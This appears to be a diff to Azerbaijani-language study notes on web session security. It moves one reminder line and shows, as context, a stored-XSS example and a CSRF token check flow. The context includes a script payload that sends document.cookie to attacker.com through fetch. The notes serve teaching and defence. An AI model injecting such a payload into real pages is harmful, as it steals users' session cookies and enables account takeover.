@@ -47,7 +47,6 @@ Hücumçu stored XSS yerləşdirir:
 fetch("https://attacker.com/?c=" + document.cookie)
 </script>
 ```
-Yadda saxlamaq vacibdir ki, Şifrə session-da saxlanılmır ❌
 Admin/user səhifəni açır
 Brauzer session cookie-ni JS-ə verir
 
@@ -256,3 +255,5 @@ Server yoxlayır, session_id ilə session-u tapır  ,Göndərilən csrf token ==
 Bəli → əməliyyat icra olunur
 
 Xeyr → 403 Forbidden
+
+Yadda saxlamaq vacibdir ki, Şifrə session-da saxlanılmır ❌
